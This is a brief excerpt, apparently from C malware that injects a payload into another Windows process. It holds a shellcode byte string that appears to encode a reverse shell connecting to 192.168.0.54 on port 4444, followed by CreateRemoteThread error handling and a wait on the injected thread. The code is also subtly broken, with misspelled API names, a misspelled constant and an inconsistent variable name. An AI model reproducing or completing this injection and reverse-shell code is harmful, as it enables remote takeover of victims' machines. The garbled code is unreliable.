...
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x00\x36\x41\x54"
...
if (hTHread == NULL) {
    print("[-] Error CreateRemoteThread");
    return 1;
}

waitForSingleOject(hThread, INFINTE);
